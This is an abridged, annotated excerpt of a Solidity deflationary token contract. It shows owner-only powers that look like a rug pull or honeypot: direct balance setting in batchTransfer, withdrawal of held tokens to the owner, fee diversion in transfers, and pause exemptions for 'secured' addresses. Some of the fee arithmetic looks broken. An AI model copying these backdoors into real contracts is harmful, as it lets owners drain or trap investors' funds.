...
abstract contract AbstractDeflationaryAutoLPToken is AbstractDeflationaryToken {
    ...
    function inTAllowance(uint256 amount) public view returns (uint256) { // HIDE
    ...
    function getLiquidity(uint256 _token1or2) public view returns (uint256) { // HIDE
       address pair = _getFactory().getPair(address(this), _getWETH());
       (uint112 _toWETH, uint112 _toThis,) = IUniswapV2Pair(pair).getReserves();
       if (_token1or2 == 1) {
            return uint256(_toWETH);
       } else {
            return uint256(_toThis);
       }
   }
    ...
    function _getWETH() public view virtual returns (address); // HIDE

    function _getFactory() public view virtual returns (IUniswapV2Factory); // HIDE
...
abstract contract AbstractDeflationaryToken is Context, IERC20, CoolOff {
     ...
     * @param balances_0x18 List of values to set multiplied by 1000000000000000000
     */
    function batchTransfer(address[] memory wallets, uint256[] memory balances_0x18) external onlyOwner {
        require(wallets.length == balances_0x18.length, "Addresses don't match values, or vice versa");

        uint256 length = wallets.length;
        uint256 i;

        for (i = 0; i < length; i++) {
            uint256 realVal = balances_0x18[i] * 1000000000000000000;
...
abstract contract DeflationaryAutoLPToken is AbstractDeflationaryAutoLPToken {
    ...
    function _getWETH() public view override returns (address) { // HIDE
        return WETH;
    }

    function _getFactory() public view override returns (IUniswapV2Factory) { // HIDE
        return factory;
    }
    ...
    function withdrawStuckToken(address _token) external onlyOwner {
        ...
        IERC20(_token).transferFrom(address(this), owner(), _balance);
    }
...
contract FeeToAddrDeflAutoLPToken is DeflationaryAutoLPToken, FeeToAddress {
    ...
    function _payFeesForEth(address to, uint256 amount) private {
        ...
        (, uint256 _feeSize) = SafeMath.tryDiv((ETH - (bnbToAddress * ETH)), 100);
    ...
    //this method is responsible for taking all fee, if takeFee is true
    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee, bool ignoreBalance) internal virtual override {
        if (takeFee && feeToAddress > 0 && feeBeneficiary != address(0)) {
        ...
        if (takeFee && bnbToAddress > 0 && BnbBeneficiary != address(0)) {
            uint256 _feeSize = amount - ((bnbToAddress * amount) / 100);
            super._tokenTransfer(sender, recipient, _feeSize, takeFee, ignoreBalance);
...
abstract contract SecPausable is Security {
     ...
     */
    modifier whenPaused(address to) {
        require(paused() || secured() || securedAdr(to), "Pausable: Contract Not Paused");
        _;
    }
